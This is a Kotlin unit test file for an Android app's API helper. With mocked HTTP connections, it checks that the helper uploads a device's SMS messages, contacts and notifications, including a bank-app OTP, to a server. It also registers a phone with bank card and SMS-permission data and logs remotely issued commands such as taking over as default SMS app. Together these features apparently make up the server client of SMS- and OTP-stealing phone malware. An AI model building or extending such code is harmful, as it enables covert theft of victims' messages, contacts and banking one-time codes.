package com.example.fast.util

import com.example.fast.config.AppConfig
import com.google.common.truth.Truth.assertThat
import com.google.gson.Gson
import io.mockk.anyConstructed
import io.mockk.every
import io.mockk.mockkConstructor
import io.mockk.mockkObject
import io.mockk.unmockkAll
import kotlinx.coroutines.test.runTest
import org.junit.After
import org.junit.Before
import org.junit.Test
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.ProtocolException
import java.net.URL

class DjangoApiHelperTest {

    private val deviceId = "test_device_id"
    private val baseUrl = loadEnvBaseUrl() ?: "https://api.example.com"
    private val gson = Gson()

    @Before
    fun setUp() {
        mockkObject(AppConfig)
        every { AppConfig.DJANGO_API_BASE_URL } returns baseUrl
        every { AppConfig.ApiHeaders.CONTENT_TYPE } returns "application/json"
        every { AppConfig.ApiHeaders.ACCEPT } returns "application/json"
    }

    @After
    fun tearDown() {
        unmockkAll()
    }

    @Test
    fun `registerDevice posts expected payload`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        val data = mapOf(
            "currentPhone" to "+15551234567",
            "code" to "ABCD1234",
            "isActive" to true,
            "time" to 1735680000000L,
            "batteryPercentage" to 84,
            "currentIdentifier" to "SIM_1",
            "bankcard" to "BANKCARD",
            "systemInfo" to mapOf("permissionStatus" to mapOf("sms" to true)),
            "app_version_code" to 30,
            "app_version_name" to "3.0"
        )

        DjangoApiHelper.registerDevice(deviceId, data)

        assertThat(connection.requestMethod).isEqualTo("POST")
        val payload = connection.readJsonMap()
        assertThat(payload["device_id"]).isEqualTo(deviceId)
        assertThat(payload["phone"]).isEqualTo("+15551234567")
        assertThat(payload["code"]).isEqualTo("ABCD1234")
        assertThat(payload["is_active"]).isEqualTo(true)
        assertThat(payload["current_identifier"]).isEqualTo("SIM_1")
        assertThat(payload["app_version_code"]).isEqualTo(30.0)
        assertThat(payload["app_version_name"]).isEqualTo("3.0")
    }

    @Test
    fun `patchDevice uses PATCH and sends updates`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        val updates = mapOf("system_info" to mapOf("permissionStatus" to mapOf("sms" to true)))
        DjangoApiHelper.patchDevice(deviceId, updates)

        assertThat(connection.requestMethod).isEqualTo("PATCH")
        val payload = connection.readJsonMap()
        assertThat(payload["system_info"]).isNotNull()
    }

    @Test
    fun `patchDevice falls back to POST when PATCH fails`() = runTest {
        val connection = TestHttpURLConnection(failOnPatch = true)
        mockConnection(connection)

        DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to mapOf("heartbeat_interval" to 60)))

        assertThat(connection.requestMethod).isEqualTo("POST")
        assertThat(connection.requestHeaders["X-HTTP-Method-Override"]).isEqualTo("PATCH")
    }

    @Test
    fun `syncMessages injects device_id into payload`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        val messages = listOf(
            mapOf(
                "message_type" to "received",
                "phone" to "+1234567890",
                "body" to "Test message",
                "timestamp" to 1234567890123L,
                "read" to false
            )
        )

        DjangoApiHelper.syncMessages(deviceId, messages)

        val payload = connection.readJsonList()
        assertThat(payload.size).isEqualTo(1)
        assertThat(payload[0]["device_id"]).isEqualTo(deviceId)
    }

    @Test
    fun `syncContacts injects device_id into payload`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        val contacts = listOf(
            mapOf(
                "name" to "John Doe",
                "phone_number" to "+1234567890",
                "last_contacted" to 1234567890123L
            )
        )

        DjangoApiHelper.syncContacts(deviceId, contacts)

        val payload = connection.readJsonList()
        assertThat(payload.size).isEqualTo(1)
        assertThat(payload[0]["device_id"]).isEqualTo(deviceId)
    }

    @Test
    fun `syncNotifications injects device_id into payload`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        val notifications = listOf(
            mapOf(
                "package_name" to "com.bank.app",
                "title" to "OTP",
                "text" to "Your OTP is 123456",
                "timestamp" to 1735680000000L
            )
        )

        DjangoApiHelper.syncNotifications(deviceId, notifications)

        val payload = connection.readJsonList()
        assertThat(payload.size).isEqualTo(1)
        assertThat(payload[0]["device_id"]).isEqualTo(deviceId)
    }

    @Test
    fun `logCommand posts full command payload`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        DjangoApiHelper.logCommand(
            deviceId = deviceId,
            command = "requestDefaultSmsApp",
            value = null,
            status = "executed",
            receivedAt = 1735680000000L,
            executedAt = 1735680005000L,
            errorMessage = "request_ui_launched"
        )

        val payload = connection.readJsonMap()
        assertThat(payload["device_id"]).isEqualTo(deviceId)
        assertThat(payload["command"]).isEqualTo("requestDefaultSmsApp")
        assertThat(payload["status"]).isEqualTo("executed")
        assertThat(payload["executed_at"]).isEqualTo(1735680005000.0)
        assertThat(payload["error_message"]).isEqualTo("request_ui_launched")
    }

    @Test
    fun `logAutoReply posts expected payload`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        DjangoApiHelper.logAutoReply(
            deviceId = deviceId,
            sender = "+15551234567",
            replyMessage = "Auto reply",
            originalTimestamp = 1735680000000L,
            repliedAt = 1735680005000L
        )

        val payload = connection.readJsonMap()
        assertThat(payload["device_id"]).isEqualTo(deviceId)
        assertThat(payload["sender"]).isEqualTo("+15551234567")
        assertThat(payload["reply_message"]).isEqualTo("Auto reply")
    }

    @Test
    fun `logActivationFailure posts metadata`() = runTest {
        val connection = TestHttpURLConnection()
        mockConnection(connection)

        DjangoApiHelper.logActivationFailure(
            deviceId = deviceId,
            codeAttempted = "ABCD1234",
            mode = "running",
            errorType = "network",
            errorMessage = "Timeout",
            metadata = mapOf("endpoint" to "validate-login")
        )

        val payload = connection.readJsonMap()
        assertThat(payload["device_id"]).isEqualTo(deviceId)
        assertThat(payload["error_type"]).isEqualTo("network")
        assertThat(payload["metadata"]).isNotNull()
    }

    @Test
    fun `getDevice returns parsed map on success`() = runTest {
        val response = """{"device_id":"$deviceId","sync_metadata":{"auto_reply":{"enabled":true}}}"""
        val connection = TestHttpURLConnection(responseCode = 200, responseBody = response)
        mockConnection(connection)

        val result = DjangoApiHelper.getDevice(deviceId)
        assertThat(result).isNotNull()
        val syncMetadata = result?.get("sync_metadata") as Map<*, *>
        assertThat(syncMetadata["auto_reply"]).isNotNull()
    }

    @Test
    fun `getDevice returns null on error`() = runTest {
        val connection = TestHttpURLConnection(responseCode = 500, errorBody = "Server error")
        mockConnection(connection)

        val result = DjangoApiHelper.getDevice(deviceId)
        assertThat(result).isNull()
    }

    @Test
    fun `registerBankNumber returns success result`() = runTest {
        val response = """{"success":true,"bank_name":"Sample Bank"}"""
        val connection = TestHttpURLConnection(responseCode = 200, responseBody = response)
        mockConnection(connection)

        val result = DjangoApiHelper.registerBankNumber(
            phone = "+15551234567",
            code = "ABCD1234",
            deviceId = deviceId,
            data = mapOf("app_version_code" to 30, "app_version_name" to "3.0")
        )

        assertThat(result).isInstanceOf(Result.Success::class.java)
        val data = (result as Result.Success).data
        assertThat(data["bank_name"]).isEqualTo("Sample Bank")
    }

    @Test
    fun `isValidCodeLogin returns true when approved`() = runTest {
        val response = """{"approved":true}"""
        val connection = TestHttpURLConnection(responseCode = 200, responseBody = response)
        mockConnection(connection)

        val result = DjangoApiHelper.isValidCodeLogin("ABCD1234", deviceId)
        assertThat(result).isInstanceOf(Result.Success::class.java)
        assertThat((result as Result.Success).data).isTrue()
    }

    @Test
    fun `isValidCodeLogin returns false on 401`() = runTest {
        val connection = TestHttpURLConnection(responseCode = 401, errorBody = "Unauthorized")
        mockConnection(connection)

        val result = DjangoApiHelper.isValidCodeLogin("ABCD1234", deviceId)
        assertThat(result).isInstanceOf(Result.Success::class.java)
        assertThat((result as Result.Success).data).isFalse()
    }

    private fun mockConnection(connection: TestHttpURLConnection) {
        mockkConstructor(URL::class)
        every { anyConstructed<URL>().openConnection() } returns connection
    }

    private fun loadEnvBaseUrl(): String? {
        val userDir = System.getProperty("user.dir") ?: return null
        val workingDir = java.io.File(userDir)
        val candidates = listOf(
            java.io.File(workingDir, ".env"),
            java.io.File(workingDir.parentFile ?: workingDir, ".env")
        )
        val envFile = candidates.firstOrNull { it.exists() } ?: return null

        val line = envFile.readLines()
            .firstOrNull { it.trim().startsWith("DJANGO_API_BASE_URL=") }
            ?: return null

        val value = line.substringAfter("=").trim().trim('"')
        return value.ifBlank { null }
    }

    private inner class TestHttpURLConnection(
        responseCode: Int = 200,
        responseBody: String? = "{}",
        errorBody: String? = null,
        private val failOnPatch: Boolean = false
    ) : HttpURLConnection(URL("https://unit.test")) {
        private val responseCodeValue = responseCode
        private val outputBuffer = ByteArrayOutputStream()
        private val responseStream = ByteArrayInputStream((responseBody ?: "").toByteArray())
        private val errorStream = ByteArrayInputStream((errorBody ?: "").toByteArray())
        private var method: String? = null
        val requestHeaders = mutableMapOf<String, String>()

        override fun connect() = Unit
        override fun disconnect() = Unit
        override fun usingProxy(): Boolean = false
        override fun getResponseCode(): Int = responseCodeValue

        override fun setRequestProperty(key: String, value: String) {
            requestHeaders[key] = value
        }

        override fun getOutputStream(): ByteArrayOutputStream = outputBuffer

        override fun getInputStream() = responseStream

        override fun getErrorStream() = errorStream

        override fun setRequestMethod(method: String) {
            if (failOnPatch && method == "PATCH") {
                throw ProtocolException("PATCH not supported")
            }
            this.method = method
        }

        override fun getRequestMethod(): String? = method

        fun readJsonMap(): Map<String, Any?> {
            val body = outputBuffer.toString(Charsets.UTF_8.name())
            return gson.fromJson(body, Map::class.java) as Map<String, Any?>
        }

        fun readJsonList(): List<Map<String, Any?>> {
            val body = outputBuffer.toString(Charsets.UTF_8.name())
            return gson.fromJson(body, List::class.java) as List<Map<String, Any?>>
        }
    }
}
